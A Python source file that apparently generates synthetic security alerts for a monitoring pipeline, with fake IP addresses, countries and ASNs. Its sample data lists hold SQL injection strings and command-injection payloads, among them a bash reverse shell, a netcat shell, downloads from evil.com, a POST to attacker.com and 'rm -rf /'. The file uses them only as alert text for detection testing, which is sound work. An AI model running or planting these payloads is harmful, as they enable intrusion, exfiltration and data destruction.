from ..utils.config_manager import ConfigManager
from ..models.alert_scheme import Alert
from ipaddress import IPv4Address
from typing import List, Tuple
from faker import Faker
import logging
import random
import time

class AlertsGenerator:
    
    def __init__(self):
        # config reader
        self.config_manager = ConfigManager()
        self.config = self.config_manager.get_alerts_generator_config()
        
        self.num_alerts = self.config.get("num_alerts", 1000)
        self.alerts_interval = self.config.get("alert_interarrival_ms", 0.2)
        self.num_unique_ip_addresses = self.config.get("num_ip_addresses", 100)
      
        # alert ids
        self.alert_ids = [40, 41, 42, 68, 61, 79]
        # generate ip addresses
        self.ip_addresses = self.generate_unique_ip_addresses()
        
        self.countries_asns = {
            'US': [7922, 15169, 16509, 20940, 36351],
            'CN': [4134, 4837, 9394, 17623, 37963],
            'RU': [8359, 12389, 29182, 31133, 48642],
            'DE': [3320, 8767, 29562, 31334, 35244],
            'FR': [3215, 5410, 12322, 15557, 16276], 
            'GB': [2856, 5607, 12576, 20712, 25180], 
            'JP': [2497, 4713, 7506, 9605, 17676], 
            'KR': [4766, 9318, 17858, 45400, 9644],  
            'IN': [4755, 9829, 17813, 24560, 45609], 
            'BR': [7738, 8167, 16735, 18881, 28573], 
        }
        
        self.private_ranges = [
            ('192.168.0.0', '192.168.255.255'),
            ('10.0.0.0', '10.255.255.255'),
            ('172.16.0.0', '172.31.255.255'),
            ('127.0.0.0', '127.255.255.255')
        ]
        
        self.sql_injections = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM passwords --",
            "admin'--",
            "' OR 1=1#",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR 'x'='x",
            "1'; INSERT INTO log VALUES('hacked'); --"
        ]
        
        self.rce_payloads = [
            "; cat /etc/passwd",
            "&& whoami",
            "| nc -l -p 4444 -e /bin/sh",
            "; wget http://evil.com/shell.sh",
            "&& curl -X POST http://attacker.com/data",
            "| python -c 'import os; os.system(\"rm -rf /\")'",
            "; bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
            "&& powershell -enc SQBuAHYAbwBrAGUA"
        ]
        
        self.ssh_versions = [
            "OpenSSH_4.3",
            "OpenSSH_5.1",
            "OpenSSH_6.0",
            "libssh_0.6.1",
            "OpenSSH_7.2"
        ]
        
        self.scanner_info = [
            "possible zmap detected",
            "possible masscan detected",
            "port scan detected",
            "botnet scanner activity"
        ]
        
        self.exploit_patterns = [
            "URL starting with dot (.env)",
            "/.env",
            "/.prod.env",
            "/media../.git/config",
            "/assets../.git/config",
            "/project/.git/config",
        ]
    
    def generate_unique_ip_addresses(self):
        """Generate a mix of private and public IP addresses"""
        fake = Faker()
        
        ip_addresses = set()
        
        while len(ip_addresses) < self.num_unique_ip_addresses:
            ip_addresses.add(fake.ipv4_public())
        
        return list(ip_addresses)
    
    def generate_alert_id(self):
        """Generate a random alert ID from the available types"""
        return random.choice(self.alert_ids)
    
    def generate_alert_description(self, alert_id):
        """Generate realistic alert description based on alert ID"""
        if alert_id == 40:  # SQL Injection
            return f"{random.choice(self.sql_injections)}"
        elif alert_id == 41:  # RCE Injection
            return f"{random.choice(self.rce_payloads)}"
        elif alert_id == 42:  # Empty or missing user agent
            return "HTTP request with empty or missing User-Agent header"
        elif alert_id == 68:  # Possible Exploit
            return random.choice(self.exploit_patterns)
        elif alert_id == 61:  # SSH obsolete version
            return f"{random.choice(self.ssh_versions)}"
        elif alert_id == 79:  # Malicious Fingerprint
            return random.choice(self.scanner_info)
    
    def generate_alert_reason(self, alert_id):
        if alert_id == 40:  # SQL Injection
            return "Detected SQL Inj in logs"
        elif alert_id == 41:  # RCE Injection
            return "Detected malicious code in logs"
        elif alert_id == 42:  # Empty or missing user agent
            return random.choice(["Missing UA", "Empty UA"])
        elif alert_id == 68:  # Possible Exploit
            return random.choice(["log4j detected", "reverse shell detected"])
        elif alert_id == 61:  # SSH obsolete version
            return "Obsolete SSH client version"
        elif alert_id == 79:  # Malicious Fingerprint
            return random.choice(["TCP Fingerprint", "JA4 Fingerprint"])
        
    def generate_country_code(self):
        """Generate a random country code"""
        return random.choice(list(self.countries_asns.keys()))
    
    def generate_asn(self, country_code=None):
        """Generate a realistic ASN, optionally for a specific country"""
        if country_code and country_code in self.countries_asns:
            return random.choice(self.countries_asns[country_code])
        else:
            # Return random ASN from any country
            all_asns = [asn for asns in self.countries_asns.values() for asn in asns]
            return random.choice(all_asns)
    
    def generate_srv_port(self, alert_id):
        """Generate realistic alert server ports on alert ID"""
        if alert_id in [40, 41, 42, 68, 79]:
            return random.choice([80, 8080, 443])
        
        elif alert_id == 61:  # SSH obsolete version
            return 22
        
    def generate_alerts(self, callback=None):
        """Generate the specified number of alerts with realistic data
        
        Args:
            callback: Optional function to call after each alert is generated.
                    The callback will receive the alert as its parameter.
        """
        alerts = []
        
        for alert_idx in range(self.num_alerts):
            alert = self.generate_alert()
            alerts.append(alert)
            
            # call callback if provided, send to kafka
            if callback:
                try:
                    callback(alert)
                except Exception as e:
                    print(f"Callback failed: {e}")
            
            # Sleep between alerts (convert ms to seconds)
            if alert_idx < self.num_alerts - 1:
                time.sleep(self.alerts_interval / 1000)
        
        return alerts
    
    def generate_alert(self):
        # Generate alert ID first to influence other properties
        alert_id = self.generate_alert_id()
        
        # Generate client info
        cli_localhost = random.choice([True, False])
        cli_ip = random.choice(self.ip_addresses)
        cli_country = self.generate_country_code()
        cli_asn = self.generate_asn(cli_country)
        
        # Generate server info
        # Servers are more likely to be localhost/internal for injection attacks
        if alert_id in [40, 41, 68]:  # Injection/exploit attacks usually target internal servers
            srv_localhost = random.choices([True, False], weights=[0.7, 0.3])[0]
        else:
            srv_localhost = random.choice([True, False])
        
        srv_ip = random.choice(self.ip_addresses)
        srv_country = self.generate_country_code()
        srv_asn = self.generate_asn(srv_country)
        srv_port = self.generate_srv_port(alert_id)
        
        # Generate alert description
        info = self.generate_alert_description(alert_id)
        reason = self.generate_alert_reason(alert_id)
        
        # Create alert object
        alert = Alert(
            cli_ip=cli_ip,
            cli_localhost=cli_localhost,
            cli_country=cli_country,
            cli_asn=cli_asn,
            
            srv_ip=srv_ip,
            srv_port=srv_port,
            srv_localhost=srv_localhost,
            srv_country=srv_country,
            srv_asn=srv_asn,
            
            alert_id=alert_id,
            info=info,
            reason=reason
        )
        
        return alert
        
    def get_alert_type_name(self, alert_id):
        """Get human-readable alert type name"""
        type_names = {
            40: "SQL Injection",
            41: "RCE Injection", 
            42: "Missing User Agent",
            68: "Possible Exploit",
            61: "SSH Obsolete Version",
            79: "Malicious Fingerprint"
        }
        return type_names.get(alert_id, "Unknown")

    def print_alert(self, alert):
        print(alert.model_dump(mode='json'))    